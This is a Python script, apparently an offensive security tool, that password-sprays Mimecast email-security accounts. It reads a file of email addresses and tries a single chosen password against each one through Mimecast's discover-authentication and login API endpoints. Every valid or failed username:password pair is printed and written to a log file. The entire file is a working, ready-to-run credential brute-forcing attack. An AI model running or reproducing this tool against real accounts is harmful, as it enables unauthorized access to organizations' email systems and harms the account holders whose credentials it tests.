#!/usr/bin/env python3

import requests
import uuid
import json
import hmac
import base64
import hashlib
import datetime
import threading
import time
import pytz
from pprint import pprint
import argparse
import logging
import codecs
import sys


class Mimecast:
    # Most of this class code came from https://github.com/bsdkid/mimecast-api-class

    def __init__(self, user_name, user_pass, app_id, auth_type):

        self.user_name = user_name
        self.user_pass = user_pass
        self.auth_type = auth_type
        self.app_id = app_id
        self.auth_type = auth_type

        self.baseUrl = self._discoverAuthentication()
        if self.baseUrl == 'invalid_email_address':  
            print("")
        else:
            self._login()

    def _getHdrDate(self):   
        
        date = datetime.datetime.utcnow()
        dt = date.strftime('%a, %d %b %Y %H:%M:%S')
        return dt + ' UTC'

    def _discoverAuthentication(self):       
            
            fullURI = 'https://api.mimecast.com/api/login/discover-authentication'
            requestId = str(uuid.uuid4())
            requestDate = self._getHdrDate()
            headers = {'x-mc-app-id': self.app_id, 'x-mc-req-id': requestId, 'x-mc-date': requestDate}
            params = {'data': [{'emailAddress': self.user_name}]}
            response = requests.post(fullURI, data=json.dumps(params), headers=headers)
            try:
                if 'region' in str(response.json()):
                    data = response.json()['data'][0]['region']['api'].split('//')[1]
                    return data
                else:
                    invalid = "Invalid: " + self.user_name + ":" + self.user_pass
                    print(invalid)
                    logging.info(invalid)
                    return 'invalid_email_address'
            except ValueError:
                print("")
                

    def _login(self):

            uri = '/api/login/login'
            fullURI = 'https://' + self.baseUrl + uri

            request_id = str(uuid.uuid4())
            auth_str = self.user_name + ':' + self.user_pass
            auth_str = base64.b64encode(auth_str.encode()).decode("utf-8")
            headers = {'Authorization': self.auth_type + ' ' + auth_str, 'x-mc-app-id': self.app_id, 'x-mc-req-id': request_id}
            params = {'data': [{'username': self.user_name}]}
            response = requests.post(fullURI, data=json.dumps(params), headers=headers)
            
            code = response.status_code
            if code == 200:
                success = "Success: " + self.user_name + ":" + self.user_pass
                print(success)
                logging.info(success)
            elif code == 401:
                failure = "Failure: " + self.user_name + ":" + self.user_pass
                print(failure)
                logging.info(failure)


def MimeSpray(username, password, app_id, auth_type, outfile):

        logging.basicConfig(filename=outfile, level=logging.INFO, format="%(asctime)s:%(message)s")       
        username = str(username).rstrip()
        if username != None:
            mc = Mimecast(username, password, app_id, auth_type)

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='A script to brute force mimecast logins')
    parser.add_argument('--emails', action='store', help='A list of emails in user@example.com format')
    parser.add_argument('--password', action='store', help='A password to use: Summer2019')
    parser.add_argument('--app_id', action='store', default='b3d85c4e-2e85-4a92-8d55-c6da325d4ef7', help='Arbitrary Application ID')
    parser.add_argument('--auth_type', action='store', default='Basic-AD', help='Authentication: Basic-AD, Basic-Cloud')
    parser.add_argument('--outfile', action='store', default='outfile.log', help='Log results to this file')
    args = parser.parse_args()

    f = open("%s" % args.emails, 'r')
    try:      
        for email in f:
            MimeSpray(email, args.password, args.app_id, args.auth_type, args.outfile)
    finally:
        f.close()              
